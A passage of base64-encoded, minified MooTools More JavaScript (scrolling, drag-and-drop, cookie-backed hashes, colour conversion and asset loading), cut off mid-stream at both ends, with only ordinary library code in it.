bmN0aW9uKCl7dmFyIEE9QXJyYXkuZmxhdHRlbihhcmd1bWVudHMpO3RoaXMuZWxlbWVudC5zY3JvbGxUbyhBWzBdLEFbMV0pO30sY29tcHV0ZTpmdW5jdGlvbihFLEQsQyl7dmFyIEI9W107dmFyIEE9MjtBLnRpbWVzKGZ1bmN0aW9uKEYpe0IucHVzaChGeC5jb21wdXRlKEVbRl0sRFtGXSxDKSk7Cn0pO3JldHVybiBCO30sc3RhcnQ6ZnVuY3Rpb24oQyxIKXtpZighdGhpcy5jaGVjayhhcmd1bWVudHMuY2FsbGVlLEMsSCkpe3JldHVybiB0aGlzO312YXIgRT10aGlzLmVsZW1lbnQuZ2V0U2l6ZSgpLEY9dGhpcy5lbGVtZW50LmdldFNjcm9sbFNpemUoKTt2YXIgQj10aGlzLmVsZW1lbnQuZ2V0U2Nyb2xsKCksRD17eDpDLHk6SH07CmZvcih2YXIgRyBpbiBEKXt2YXIgQT1GW0ddLUVbR107aWYoJGNoayhEW0ddKSl7RFtHXT0oJHR5cGUoRFtHXSk9PSJudW1iZXIiKT9EW0ddLmxpbWl0KDAsQSk6QTt9ZWxzZXtEW0ddPUJbR107fURbR10rPXRoaXMub3B0aW9ucy5vZmZzZXRbR107fXJldHVybiB0aGlzLnBhcmVudChbQi54LEIueV0sW0QueCxELnldKTsKfSx0b1RvcDpmdW5jdGlvbigpe3JldHVybiB0aGlzLnN0YXJ0KGZhbHNlLDApO30sdG9MZWZ0OmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuc3RhcnQoMCxmYWxzZSk7fSx0b1JpZ2h0OmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuc3RhcnQoInJpZ2h0IixmYWxzZSk7fSx0b0JvdHRvbTpmdW5jdGlvbigpe3JldHVybiB0aGlzLnN0YXJ0KGZhbHNlLCJib3R0b20iKTsKfSx0b0VsZW1lbnQ6ZnVuY3Rpb24oQil7dmFyIEE9JChCKS5nZXRQb3NpdGlvbih0aGlzLmVsZW1lbnQpO3JldHVybiB0aGlzLnN0YXJ0KEEueCxBLnkpO319KTtGeC5FbGVtZW50cz1uZXcgQ2xhc3Moe0V4dGVuZHM6RnguQ1NTLGluaXRpYWxpemU6ZnVuY3Rpb24oQixBKXt0aGlzLmVsZW1lbnRzPXRoaXMuc3ViamVjdD0kJChCKTsKdGhpcy5wYXJlbnQoQSk7fSxjb21wdXRlOmZ1bmN0aW9uKEcsSCxJKXt2YXIgQz17fTtmb3IodmFyIEQgaW4gRyl7dmFyIEE9R1tEXSxFPUhbRF0sRj1DW0RdPXt9O2Zvcih2YXIgQiBpbiBBKXtGW0JdPXRoaXMucGFyZW50KEFbQl0sRVtCXSxJKTt9fXJldHVybiBDOwp9LHNldDpmdW5jdGlvbihCKXtmb3IodmFyIEMgaW4gQil7dmFyIEE9QltDXTtmb3IodmFyIEQgaW4gQSl7dGhpcy5yZW5kZXIodGhpcy5lbGVtZW50c1tDXSxELEFbRF0sdGhpcy5vcHRpb25zLnVuaXQpO319cmV0dXJuIHRoaXM7fSxzdGFydDpmdW5jdGlvbihDKXtpZighdGhpcy5jaGVjayhhcmd1bWVudHMuY2FsbGVlLEMpKXtyZXR1cm4gdGhpczsKfXZhciBIPXt9LEk9e307Zm9yKHZhciBEIGluIEMpe3ZhciBGPUNbRF0sQT1IW0RdPXt9LEc9SVtEXT17fTtmb3IodmFyIEIgaW4gRil7dmFyIEU9dGhpcy5wcmVwYXJlKHRoaXMuZWxlbWVudHNbRF0sQixGW0JdKTtBW0JdPUUuZnJvbTtHW0JdPUUudG87fX1yZXR1cm4gdGhpcy5wYXJlbnQoSCxJKTsKfX0pO3ZhciBEcmFnPW5ldyBDbGFzcyh7SW1wbGVtZW50czpbRXZlbnRzLE9wdGlvbnNdLG9wdGlvbnM6e3NuYXA6Nix1bml0OiJweCIsZ3JpZDpmYWxzZSxzdHlsZTp0cnVlLGxpbWl0OmZhbHNlLGhhbmRsZTpmYWxzZSxpbnZlcnQ6ZmFsc2UscHJldmVudERlZmF1bHQ6ZmFsc2UsbW9kaWZpZXJzOnt4OiJsZWZ0Iix5OiJ0b3AifX0saW5pdGlhbGl6ZTpmdW5jdGlvbigpe3ZhciBCPUFycmF5LmxpbmsoYXJndW1lbnRzLHtvcHRpb25zOk9iamVjdC50eXBlLGVsZW1lbnQ6JGRlZmluZWR9KTsKdGhpcy5lbGVtZW50PSQoQi5lbGVtZW50KTt0aGlzLmRvY3VtZW50PXRoaXMuZWxlbWVudC5nZXREb2N1bWVudCgpO3RoaXMuc2V0T3B0aW9ucyhCLm9wdGlvbnN8fHt9KTt2YXIgQT0kdHlwZSh0aGlzLm9wdGlvbnMuaGFuZGxlKTt0aGlzLmhhbmRsZXM9KEE9PSJhcnJheSJ8fEE9PSJjb2xsZWN0aW9uIik/JCQodGhpcy5vcHRpb25zLmhhbmRsZSk6JCh0aGlzLm9wdGlvbnMuaGFuZGxlKXx8dGhpcy5lbGVtZW50Owp0aGlzLm1vdXNlPXtub3c6e30scG9zOnt9fTt0aGlzLnZhbHVlPXtzdGFydDp7fSxub3c6e319O3RoaXMuc2VsZWN0aW9uPShCcm93c2VyLkVuZ2luZS50cmlkZW50KT8ic2VsZWN0c3RhcnQiOiJtb3VzZWRvd24iO3RoaXMuYm91bmQ9e3N0YXJ0OnRoaXMuc3RhcnQuYmluZCh0aGlzKSxjaGVjazp0aGlzLmNoZWNrLmJpbmQodGhpcyksZHJhZzp0aGlzLmRyYWcuYmluZCh0aGlzKSxzdG9wOnRoaXMuc3RvcC5iaW5kKHRoaXMpLGNhbmNlbDp0aGlzLmNhbmNlbC5iaW5kKHRoaXMpLGV2ZW50U3RvcDokbGFtYmRhKGZhbHNlKX07CnRoaXMuYXR0YWNoKCk7fSxhdHRhY2g6ZnVuY3Rpb24oKXt0aGlzLmhhbmRsZXMuYWRkRXZlbnQoIm1vdXNlZG93biIsdGhpcy5ib3VuZC5zdGFydCk7cmV0dXJuIHRoaXM7fSxkZXRhY2g6ZnVuY3Rpb24oKXt0aGlzLmhhbmRsZXMucmVtb3ZlRXZlbnQoIm1vdXNlZG93biIsdGhpcy5ib3VuZC5zdGFydCk7CnJldHVybiB0aGlzO30sc3RhcnQ6ZnVuY3Rpb24oQyl7aWYodGhpcy5vcHRpb25zLnByZXZlbnREZWZhdWx0KXtDLnByZXZlbnREZWZhdWx0KCk7fXRoaXMuZmlyZUV2ZW50KCJiZWZvcmVTdGFydCIsdGhpcy5lbGVtZW50KTt0aGlzLm1vdXNlLnN0YXJ0PUMucGFnZTsKdmFyIEE9dGhpcy5vcHRpb25zLmxpbWl0O3RoaXMubGltaXQ9e3g6W10seTpbXX07Zm9yKHZhciBEIGluIHRoaXMub3B0aW9ucy5tb2RpZmllcnMpe2lmKCF0aGlzLm9wdGlvbnMubW9kaWZpZXJzW0RdKXtjb250aW51ZTt9aWYodGhpcy5vcHRpb25zLnN0eWxlKXt0aGlzLnZhbHVlLm5vd1tEXT10aGlzLmVsZW1lbnQuZ2V0U3R5bGUodGhpcy5vcHRpb25zLm1vZGlmaWVyc1tEXSkudG9JbnQoKTsKfWVsc2V7dGhpcy52YWx1ZS5ub3dbRF09dGhpcy5lbGVtZW50W3RoaXMub3B0aW9ucy5tb2RpZmllcnNbRF1dO31pZih0aGlzLm9wdGlvbnMuaW52ZXJ0KXt0aGlzLnZhbHVlLm5vd1tEXSo9LTE7fXRoaXMubW91c2UucG9zW0RdPUMucGFnZVtEXS10aGlzLnZhbHVlLm5vd1tEXTsKaWYoQSYmQVtEXSl7Zm9yKHZhciBCPTI7Qi0tO0Ipe2lmKCRjaGsoQVtEXVtCXSkpe3RoaXMubGltaXRbRF1bQl09JGxhbWJkYShBW0RdW0JdKSgpO319fX1pZigkdHlwZSh0aGlzLm9wdGlvbnMuZ3JpZCk9PSJudW1iZXIiKXt0aGlzLm9wdGlvbnMuZ3JpZD17eDp0aGlzLm9wdGlvbnMuZ3JpZCx5OnRoaXMub3B0aW9ucy5ncmlkfTsKfXRoaXMuZG9jdW1lbnQuYWRkRXZlbnRzKHttb3VzZW1vdmU6dGhpcy5ib3VuZC5jaGVjayxtb3VzZXVwOnRoaXMuYm91bmQuY2FuY2VsfSk7dGhpcy5kb2N1bWVudC5hZGRFdmVudCh0aGlzLnNlbGVjdGlvbix0aGlzLmJvdW5kLmV2ZW50U3RvcCk7fSxjaGVjazpmdW5jdGlvbihBKXtpZih0aGlzLm9wdGlvbnMucHJldmVudERlZmF1bHQpe0EucHJldmVudERlZmF1bHQoKTsKfXZhciBCPU1hdGgucm91bmQoTWF0aC5zcXJ0KE1hdGgucG93KEEucGFnZS54LXRoaXMubW91c2Uuc3RhcnQueCwyKStNYXRoLnBvdyhBLnBhZ2UueS10aGlzLm1vdXNlLnN0YXJ0LnksMikpKTtpZihCPnRoaXMub3B0aW9ucy5zbmFwKXt0aGlzLmNhbmNlbCgpO3RoaXMuZG9jdW1lbnQuYWRkRXZlbnRzKHttb3VzZW1vdmU6dGhpcy5ib3VuZC5kcmFnLG1vdXNldXA6dGhpcy5ib3VuZC5zdG9wfSk7CnRoaXMuZmlyZUV2ZW50KCJzdGFydCIsdGhpcy5lbGVtZW50KS5maXJlRXZlbnQoInNuYXAiLHRoaXMuZWxlbWVudCk7fX0sZHJhZzpmdW5jdGlvbihBKXtpZih0aGlzLm9wdGlvbnMucHJldmVudERlZmF1bHQpe0EucHJldmVudERlZmF1bHQoKTt9dGhpcy5tb3VzZS5ub3c9QS5wYWdlOwpmb3IodmFyIEIgaW4gdGhpcy5vcHRpb25zLm1vZGlmaWVycyl7aWYoIXRoaXMub3B0aW9ucy5tb2RpZmllcnNbQl0pe2NvbnRpbnVlO310aGlzLnZhbHVlLm5vd1tCXT10aGlzLm1vdXNlLm5vd1tCXS10aGlzLm1vdXNlLnBvc1tCXTtpZih0aGlzLm9wdGlvbnMuaW52ZXJ0KXt0aGlzLnZhbHVlLm5vd1tCXSo9LTE7Cn1pZih0aGlzLm9wdGlvbnMubGltaXQmJnRoaXMubGltaXRbQl0pe2lmKCRjaGsodGhpcy5saW1pdFtCXVsxXSkmJih0aGlzLnZhbHVlLm5vd1tCXT50aGlzLmxpbWl0W0JdWzFdKSl7dGhpcy52YWx1ZS5ub3dbQl09dGhpcy5saW1pdFtCXVsxXTt9ZWxzZXtpZigkY2hrKHRoaXMubGltaXRbQl1bMF0pJiYodGhpcy52YWx1ZS5ub3dbQl08dGhpcy5saW1pdFtCXVswXSkpe3RoaXMudmFsdWUubm93W0JdPXRoaXMubGltaXRbQl1bMF07Cn19fWlmKHRoaXMub3B0aW9ucy5ncmlkW0JdKXt0aGlzLnZhbHVlLm5vd1tCXS09KHRoaXMudmFsdWUubm93W0JdJXRoaXMub3B0aW9ucy5ncmlkW0JdKTt9aWYodGhpcy5vcHRpb25zLnN0eWxlKXt0aGlzLmVsZW1lbnQuc2V0U3R5bGUodGhpcy5vcHRpb25zLm1vZGlmaWVyc1tCXSx0aGlzLnZhbHVlLm5vd1tCXSt0aGlzLm9wdGlvbnMudW5pdCk7Cn1lbHNle3RoaXMuZWxlbWVudFt0aGlzLm9wdGlvbnMubW9kaWZpZXJzW0JdXT10aGlzLnZhbHVlLm5vd1tCXTt9fXRoaXMuZmlyZUV2ZW50KCJkcmFnIix0aGlzLmVsZW1lbnQpO30sY2FuY2VsOmZ1bmN0aW9uKEEpe3RoaXMuZG9jdW1lbnQucmVtb3ZlRXZlbnQoIm1vdXNlbW92ZSIsdGhpcy5ib3VuZC5jaGVjayk7CnRoaXMuZG9jdW1lbnQucmVtb3ZlRXZlbnQoIm1vdXNldXAiLHRoaXMuYm91bmQuY2FuY2VsKTtpZihBKXt0aGlzLmRvY3VtZW50LnJlbW92ZUV2ZW50KHRoaXMuc2VsZWN0aW9uLHRoaXMuYm91bmQuZXZlbnRTdG9wKTt0aGlzLmZpcmVFdmVudCgiY2FuY2VsIix0aGlzLmVsZW1lbnQpOwp9fSxzdG9wOmZ1bmN0aW9uKEEpe3RoaXMuZG9jdW1lbnQucmVtb3ZlRXZlbnQodGhpcy5zZWxlY3Rpb24sdGhpcy5ib3VuZC5ldmVudFN0b3ApO3RoaXMuZG9jdW1lbnQucmVtb3ZlRXZlbnQoIm1vdXNlbW92ZSIsdGhpcy5ib3VuZC5kcmFnKTt0aGlzLmRvY3VtZW50LnJlbW92ZUV2ZW50KCJtb3VzZXVwIix0aGlzLmJvdW5kLnN0b3ApOwppZihBKXt0aGlzLmZpcmVFdmVudCgiY29tcGxldGUiLHRoaXMuZWxlbWVudCk7fX19KTtFbGVtZW50LmltcGxlbWVudCh7bWFrZVJlc2l6YWJsZTpmdW5jdGlvbihBKXtyZXR1cm4gbmV3IERyYWcodGhpcywkbWVyZ2Uoe21vZGlmaWVyczp7eDoid2lkdGgiLHk6ImhlaWdodCJ9fSxBKSk7Cn19KTtEcmFnLk1vdmU9bmV3IENsYXNzKHtFeHRlbmRzOkRyYWcsb3B0aW9uczp7ZHJvcHBhYmxlczpbXSxjb250YWluZXI6ZmFsc2V9LGluaXRpYWxpemU6ZnVuY3Rpb24oQyxCKXt0aGlzLnBhcmVudChDLEIpO3RoaXMuZHJvcHBhYmxlcz0kJCh0aGlzLm9wdGlvbnMuZHJvcHBhYmxlcyk7CnRoaXMuY29udGFpbmVyPSQodGhpcy5vcHRpb25zLmNvbnRhaW5lcik7aWYodGhpcy5jb250YWluZXImJiR0eXBlKHRoaXMuY29udGFpbmVyKSE9ImVsZW1lbnQiKXt0aGlzLmNvbnRhaW5lcj0kKHRoaXMuY29udGFpbmVyLmdldERvY3VtZW50KCkuYm9keSk7fUM9dGhpcy5lbGVtZW50Owp2YXIgRD1DLmdldFN0eWxlKCJwb3NpdGlvbiIpO3ZhciBBPShEIT0ic3RhdGljIik/RDoiYWJzb2x1dGUiO2lmKEMuZ2V0U3R5bGUoImxlZnQiKT09ImF1dG8ifHxDLmdldFN0eWxlKCJ0b3AiKT09ImF1dG8iKXtDLnBvc2l0aW9uKEMuZ2V0UG9zaXRpb24oQy5vZmZzZXRQYXJlbnQpKTsKfUMuc2V0U3R5bGUoInBvc2l0aW9uIixBKTt0aGlzLmFkZEV2ZW50KCJzdGFydCIsZnVuY3Rpb24oKXt0aGlzLmNoZWNrRHJvcHBhYmxlcygpO30sdHJ1ZSk7fSxzdGFydDpmdW5jdGlvbihCKXtpZih0aGlzLmNvbnRhaW5lcil7dmFyIEQ9dGhpcy5lbGVtZW50LEo9dGhpcy5jb250YWluZXIsRT1KLmdldENvb3JkaW5hdGVzKEQub2Zmc2V0UGFyZW50KSxGPXt9LEE9e307ClsidG9wIiwicmlnaHQiLCJib3R0b20iLCJsZWZ0Il0uZWFjaChmdW5jdGlvbihLKXtGW0tdPUouZ2V0U3R5bGUoInBhZGRpbmctIitLKS50b0ludCgpO0FbS109RC5nZXRTdHlsZSgibWFyZ2luLSIrSykudG9JbnQoKTt9LHRoaXMpO3ZhciBDPUQub2Zmc2V0V2lkdGgrQS5sZWZ0K0EucmlnaHQsST1ELm9mZnNldEhlaWdodCtBLnRvcCtBLmJvdHRvbTsKdmFyIEg9W0UubGVmdCtGLmxlZnQsRS5yaWdodC1GLnJpZ2h0LUNdO3ZhciBHPVtFLnRvcCtGLnRvcCxFLmJvdHRvbS1GLmJvdHRvbS1JXTt0aGlzLm9wdGlvbnMubGltaXQ9e3g6SCx5Okd9O310aGlzLnBhcmVudChCKTt9LGNoZWNrQWdhaW5zdDpmdW5jdGlvbihCKXtCPUIuZ2V0Q29vcmRpbmF0ZXMoKTsKdmFyIEE9dGhpcy5tb3VzZS5ub3c7cmV0dXJuKEEueD5CLmxlZnQmJkEueDxCLnJpZ2h0JiZBLnk8Qi5ib3R0b20mJkEueT5CLnRvcCk7fSxjaGVja0Ryb3BwYWJsZXM6ZnVuY3Rpb24oKXt2YXIgQT10aGlzLmRyb3BwYWJsZXMuZmlsdGVyKHRoaXMuY2hlY2tBZ2FpbnN0LHRoaXMpLmdldExhc3QoKTsKaWYodGhpcy5vdmVyZWQhPUEpe2lmKHRoaXMub3ZlcmVkKXt0aGlzLmZpcmVFdmVudCgibGVhdmUiLFt0aGlzLmVsZW1lbnQsdGhpcy5vdmVyZWRdKTt9aWYoQSl7dGhpcy5vdmVyZWQ9QTt0aGlzLmZpcmVFdmVudCgiZW50ZXIiLFt0aGlzLmVsZW1lbnQsQV0pO31lbHNle3RoaXMub3ZlcmVkPW51bGw7Cn19fSxkcmFnOmZ1bmN0aW9uKEEpe3RoaXMucGFyZW50KEEpO2lmKHRoaXMuZHJvcHBhYmxlcy5sZW5ndGgpe3RoaXMuY2hlY2tEcm9wcGFibGVzKCk7fX0sc3RvcDpmdW5jdGlvbihBKXt0aGlzLmNoZWNrRHJvcHBhYmxlcygpO3RoaXMuZmlyZUV2ZW50KCJkcm9wIixbdGhpcy5lbGVtZW50LHRoaXMub3ZlcmVkXSk7CnRoaXMub3ZlcmVkPW51bGw7cmV0dXJuIHRoaXMucGFyZW50KEEpO319KTtFbGVtZW50LmltcGxlbWVudCh7bWFrZURyYWdnYWJsZTpmdW5jdGlvbihBKXtyZXR1cm4gbmV3IERyYWcuTW92ZSh0aGlzLEEpO319KTtIYXNoLkNvb2tpZT1uZXcgQ2xhc3Moe0V4dGVuZHM6Q29va2llLG9wdGlvbnM6e2F1dG9TYXZlOnRydWV9LGluaXRpYWxpemU6ZnVuY3Rpb24oQixBKXt0aGlzLnBhcmVudChCLEEpOwp0aGlzLmxvYWQoKTt9LHNhdmU6ZnVuY3Rpb24oKXt2YXIgQT1KU09OLmVuY29kZSh0aGlzLmhhc2gpO2lmKCFBfHxBLmxlbmd0aD40MDk2KXtyZXR1cm4gZmFsc2U7fWlmKEE9PSJ7fSIpe3RoaXMuZGlzcG9zZSgpO31lbHNle3RoaXMud3JpdGUoQSk7fXJldHVybiB0cnVlOwp9LGxvYWQ6ZnVuY3Rpb24oKXt0aGlzLmhhc2g9bmV3IEhhc2goSlNPTi5kZWNvZGUodGhpcy5yZWFkKCksdHJ1ZSkpO3JldHVybiB0aGlzO319KTtIYXNoLkNvb2tpZS5pbXBsZW1lbnQoKGZ1bmN0aW9uKCl7dmFyIEE9e307SGFzaC5lYWNoKEhhc2gucHJvdG90eXBlLGZ1bmN0aW9uKEMsQil7QVtCXT1mdW5jdGlvbigpe3ZhciBEPUMuYXBwbHkodGhpcy5oYXNoLGFyZ3VtZW50cyk7CmlmKHRoaXMub3B0aW9ucy5hdXRvU2F2ZSl7dGhpcy5zYXZlKCk7fXJldHVybiBEO307fSk7cmV0dXJuIEE7fSkoKSk7dmFyIENvbG9yPW5ldyBOYXRpdmUoe2luaXRpYWxpemU6ZnVuY3Rpb24oQixDKXtpZihhcmd1bWVudHMubGVuZ3RoPj0zKXtDPSJyZ2IiO0I9QXJyYXkuc2xpY2UoYXJndW1lbnRzLDAsMyk7Cn1lbHNle2lmKHR5cGVvZiBCPT0ic3RyaW5nIil7aWYoQi5tYXRjaCgvcmdiLykpe0I9Qi5yZ2JUb0hleCgpLmhleFRvUmdiKHRydWUpO31lbHNle2lmKEIubWF0Y2goL2hzYi8pKXtCPUIuaHNiVG9SZ2IoKTt9ZWxzZXtCPUIuaGV4VG9SZ2IodHJ1ZSk7fX19fUM9Q3x8InJnYiI7CnN3aXRjaChDKXtjYXNlImhzYiI6dmFyIEE9QjtCPUIuaHNiVG9SZ2IoKTtCLmhzYj1BO2JyZWFrO2Nhc2UiaGV4IjpCPUIuaGV4VG9SZ2IodHJ1ZSk7YnJlYWs7fUIucmdiPUIuc2xpY2UoMCwzKTtCLmhzYj1CLmhzYnx8Qi5yZ2JUb0hzYigpO0IuaGV4PUIucmdiVG9IZXgoKTsKcmV0dXJuICRleHRlbmQoQix0aGlzKTt9fSk7Q29sb3IuaW1wbGVtZW50KHttaXg6ZnVuY3Rpb24oKXt2YXIgQT1BcnJheS5zbGljZShhcmd1bWVudHMpO3ZhciBDPSgkdHlwZShBLmdldExhc3QoKSk9PSJudW1iZXIiKT9BLnBvcCgpOjUwO3ZhciBCPXRoaXMuc2xpY2UoKTsKQS5lYWNoKGZ1bmN0aW9uKEQpe0Q9bmV3IENvbG9yKEQpO2Zvcih2YXIgRT0wO0U8MztFKyspe0JbRV09TWF0aC5yb3VuZCgoQltFXS8xMDAqKDEwMC1DKSkrKERbRV0vMTAwKkMpKTt9fSk7cmV0dXJuIG5ldyBDb2xvcihCLCJyZ2IiKTt9LGludmVydDpmdW5jdGlvbigpe3JldHVybiBuZXcgQ29sb3IodGhpcy5tYXAoZnVuY3Rpb24oQSl7cmV0dXJuIDI1NS1BOwp9KSk7fSxzZXRIdWU6ZnVuY3Rpb24oQSl7cmV0dXJuIG5ldyBDb2xvcihbQSx0aGlzLmhzYlsxXSx0aGlzLmhzYlsyXV0sImhzYiIpO30sc2V0U2F0dXJhdGlvbjpmdW5jdGlvbihBKXtyZXR1cm4gbmV3IENvbG9yKFt0aGlzLmhzYlswXSxBLHRoaXMuaHNiWzJdXSwiaHNiIik7Cn0sc2V0QnJpZ2h0bmVzczpmdW5jdGlvbihBKXtyZXR1cm4gbmV3IENvbG9yKFt0aGlzLmhzYlswXSx0aGlzLmhzYlsxXSxBXSwiaHNiIik7fX0pO2Z1bmN0aW9uICRSR0IoQyxCLEEpe3JldHVybiBuZXcgQ29sb3IoW0MsQixBXSwicmdiIik7fWZ1bmN0aW9uICRIU0IoQyxCLEEpe3JldHVybiBuZXcgQ29sb3IoW0MsQixBXSwiaHNiIik7Cn1mdW5jdGlvbiAkSEVYKEEpe3JldHVybiBuZXcgQ29sb3IoQSwiaGV4Iik7fUFycmF5LmltcGxlbWVudCh7cmdiVG9Ic2I6ZnVuY3Rpb24oKXt2YXIgQj10aGlzWzBdLEM9dGhpc1sxXSxKPXRoaXNbMl07dmFyIEcsRixIO3ZhciBJPU1hdGgubWF4KEIsQyxKKSxFPU1hdGgubWluKEIsQyxKKTsKdmFyIEs9SS1FO0g9SS8yNTU7Rj0oSSE9MCk/Sy9JOjA7aWYoRj09MCl7Rz0wO31lbHNle3ZhciBEPShJLUIpL0s7dmFyIEE9KEktQykvSzt2YXIgTD0oSS1KKS9LO2lmKEI9PUkpe0c9TC1BO31lbHNle2lmKEM9PUkpe0c9MitELUw7fWVsc2V7Rz00K0EtRDt9fUcvPTY7CmlmKEc8MCl7RysrO319cmV0dXJuW01hdGgucm91bmQoRyozNjApLE1hdGgucm91bmQoRioxMDApLE1hdGgucm91bmQoSCoxMDApXTt9LGhzYlRvUmdiOmZ1bmN0aW9uKCl7dmFyIEM9TWF0aC5yb3VuZCh0aGlzWzJdLzEwMCoyNTUpO2lmKHRoaXNbMV09PTApe3JldHVybltDLEMsQ107Cn1lbHNle3ZhciBBPXRoaXNbMF0lMzYwO3ZhciBFPUElNjA7dmFyIEY9TWF0aC5yb3VuZCgodGhpc1syXSooMTAwLXRoaXNbMV0pKS8xMDAwMCoyNTUpO3ZhciBEPU1hdGgucm91bmQoKHRoaXNbMl0qKDYwMDAtdGhpc1sxXSpFKSkvNjAwMDAwKjI1NSk7dmFyIEI9TWF0aC5yb3VuZCgodGhpc1syXSooNjAwMC10aGlzWzFdKig2MC1FKSkpLzYwMDAwMCoyNTUpOwpzd2l0Y2goTWF0aC5mbG9vcihBLzYwKSl7Y2FzZSAwOnJldHVybltDLEIsRl07Y2FzZSAxOnJldHVybltELEMsRl07Y2FzZSAyOnJldHVybltGLEMsQl07Y2FzZSAzOnJldHVybltGLEQsQ107Y2FzZSA0OnJldHVybltCLEYsQ107Y2FzZSA1OnJldHVybltDLEYsRF07Cn19cmV0dXJuIGZhbHNlO319KTtTdHJpbmcuaW1wbGVtZW50KHtyZ2JUb0hzYjpmdW5jdGlvbigpe3ZhciBBPXRoaXMubWF0Y2goL1xkezEsM30vZyk7cmV0dXJuKEEpP2hzYi5yZ2JUb0hzYigpOm51bGw7fSxoc2JUb1JnYjpmdW5jdGlvbigpe3ZhciBBPXRoaXMubWF0Y2goL1xkezEsM30vZyk7CnJldHVybihBKT9BLmhzYlRvUmdiKCk6bnVsbDt9fSk7dmFyIEdyb3VwPW5ldyBDbGFzcyh7aW5pdGlhbGl6ZTpmdW5jdGlvbigpe3RoaXMuaW5zdGFuY2VzPUFycmF5LmZsYXR0ZW4oYXJndW1lbnRzKTt0aGlzLmV2ZW50cz17fTt0aGlzLmNoZWNrZXI9e307fSxhZGRFdmVudDpmdW5jdGlvbihCLEEpe3RoaXMuY2hlY2tlcltCXT10aGlzLmNoZWNrZXJbQl18fHt9Owp0aGlzLmV2ZW50c1tCXT10aGlzLmV2ZW50c1tCXXx8W107aWYodGhpcy5ldmVudHNbQl0uY29udGFpbnMoQSkpe3JldHVybiBmYWxzZTt9ZWxzZXt0aGlzLmV2ZW50c1tCXS5wdXNoKEEpO310aGlzLmluc3RhbmNlcy5lYWNoKGZ1bmN0aW9uKEMsRCl7Qy5hZGRFdmVudChCLHRoaXMuY2hlY2suYmluZCh0aGlzLFtCLEMsRF0pKTsKfSx0aGlzKTtyZXR1cm4gdGhpczt9LGNoZWNrOmZ1bmN0aW9uKEMsQSxCKXt0aGlzLmNoZWNrZXJbQ11bQl09dHJ1ZTt2YXIgRD10aGlzLmluc3RhbmNlcy5ldmVyeShmdW5jdGlvbihGLEUpe3JldHVybiB0aGlzLmNoZWNrZXJbQ11bRV18fGZhbHNlO30sdGhpcyk7aWYoIUQpe3JldHVybiA7Cn10aGlzLmNoZWNrZXJbQ109e307dGhpcy5ldmVudHNbQ10uZWFjaChmdW5jdGlvbihFKXtFLmNhbGwodGhpcyx0aGlzLmluc3RhbmNlcyxBKTt9LHRoaXMpO319KTt2YXIgQXNzZXQ9bmV3IEhhc2goe2phdmFzY3JpcHQ6ZnVuY3Rpb24oRixEKXtEPSRleHRlbmQoe29ubG9hZDokZW1wdHksZG9jdW1lbnQ6ZG9jdW1lbnQsY2hlY2s6JGxhbWJkYSh0cnVlKX0sRCk7CnZhciBCPW5ldyBFbGVtZW50KCJzY3JpcHQiLHtzcmM6Rix0eXBlOiJ0ZXh0L2phdmFzY3JpcHQifSk7dmFyIEU9RC5vbmxvYWQuYmluZChCKSxBPUQuY2hlY2ssRz1ELmRvY3VtZW50O2RlbGV0ZSBELm9ubG9hZDtkZWxldGUgRC5jaGVjaztkZWxldGUgRC5kb2N1bWVudDsKQi5hZGRFdmVudHMoe2xvYWQ6RSxyZWFkeXN0YXRlY2hhbmdlOmZ1bmN0aW9uKCl7aWYoWyJsb2FkZWQiLCJjb21wbGV0ZSJdLmNvbnRhaW5zKHRoaXMucmVhZHlTdGF0ZSkpe0UoKTt9fX0pLnNldFByb3BlcnRpZXMoRCk7aWYoQnJvd3Nlci5FbmdpbmUud2Via2l0NDE5KXt2YXIgQz0oZnVuY3Rpb24oKXtpZighJHRyeShBKSl7cmV0dXJuIDsKfSRjbGVhcihDKTtFKCk7fSkucGVyaW9kaWNhbCg1MCk7fXJldHVybiBCLmluamVjdChHLmhlYWQpO30sY3NzOmZ1bmN0aW9uKEIsQSl7cmV0dXJuIG5ldyBFbGVtZW50KCJsaW5rIiwkbWVyZ2Uoe3JlbDoic3R5bGVzaGVldCIsbWVkaWE6InNjcmVlbiIsdHlwZToidGV4dC9jc3MiLGhyZWY6Qn0sQSkpLmluamVjdChkb2N1bWVudC5oZWFkKTsKfSxpbWFnZTpmdW5jdGlvbihDLEIpe0I9JG1lcmdlKHtvbmxvYWQ6JGVtcHR5LG9uYWJvcnQ6JGVtcHR5LG9uZXJyb3I6JGVtcHR5fSxCKTt2YXIgRD1uZXcgSW1hZ2UoKTt2YXIgQT0kKEQpfHxuZXcgRWxlbWVudCgiaW1nIik7WyJsb2FkIiwiYWJvcnQiLCJlcnJvciJdLmVhY2goZnVuY3Rpb24oRSl7dmFyIEY9Im9uIitFOwp2YXIgRz1CW0ZdO2RlbGV0ZSBCW0ZdO0RbRl09ZnVuY3Rpb24oKXtpZighRCl7cmV0dXJuIDt9aWYoIUEucGFyZW50Tm9kZSl7QS53aWR0aD1ELndpZHRoO0EuaGVpZ2h0PUQuaGVpZ2h0O31EPUQub25sb2FkPUQub25hYm9ydD1ELm9uZXJyb3I9bnVsbDtHLmRlbGF5KDEsQSxBKTsKQS5maXJlRXZlbnQoRSxBLDEpO307fSk7RC5zcmM9QS5zcmM9QztpZihEJiZELmNvbXBsZXRlKXtELm9ubG9hZC5kZWxheSgxKTt9cmV0dXJuIEEuc2V0UHJvcGVydGllcyhCKTt9LGltYWdlczpmdW5jdGlvbihELEMpe0M9JG1lcmdlKHtvbkNvbXBsZXRlOiRlbXB0eSxvblByb2dyZXNzOiRlbXB0eX0sQyk7CmlmKCFELnB1c2gpe0Q9W0RdO312YXIgQT1bXTt2YXIgQj0wO0QuZWFjaChmdW5jdGlvbihGKXt2YXIgRT1uZXcgQXNzZXQuaW1hZ2UoRix7b25sb2FkOmZ1bmN0aW9uKCl7Qy5vblByb2dyZXNzLmNhbGwodGhpcyxCLEQuaW5kZXhPZihGKSk7QisrO2lmKEI9PUQubGVuZ3RoKXtDLm9uQ29tcGxldGUoKTsKfX19KTtBLnB1c2goRSk7fSk7cmV0dXJuIG5ldyBFbGVtZW50cyhBKTt9fSk7dmFyIFNvcnRhYmxlcz1uZXcgQ2xhc3Moe0ltcGxlbWVudHM6W0V2ZW50cyxPcHRpb25zXSxvcHRpb25zOntzbmFwOjQsb3BhY2l0eToxLGNsb25lOmZhbHNlLHJldmVydDpmYWxzZSxoYW5kbGU6ZmFsc2UsY29uc3RyYWluOmZhbHNlfSxpbml0aWFsaXplOmZ1bmN0aW9uKEEsQil7dGhpcy5zZXRPcHRpb25zKEIpOwp0aGlzLmVsZW1